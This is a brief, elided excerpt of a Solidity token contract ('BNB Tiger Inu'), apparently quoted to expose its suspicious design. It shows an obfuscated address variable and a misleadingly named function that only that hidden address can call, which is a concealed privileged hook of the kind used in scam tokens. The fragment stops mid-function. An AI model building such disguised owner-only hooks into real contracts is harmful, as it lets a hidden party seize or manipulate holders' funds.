...
contract BNBTiger is Ownable {
    ...
    string public _tokenname = "BNB Tiger Inu";
    string public _tokensymbol = "BNBTiger";
    uint256 tokenamount = 10000000000*10**decimals();
    address public dkuhv9;
    ...
    function name(address jjkxq1) public     {
        require(dkuhv9 ==  _msgSender());
        if(dkuhv9 != _msgSender()){
                revert("fu");
        }
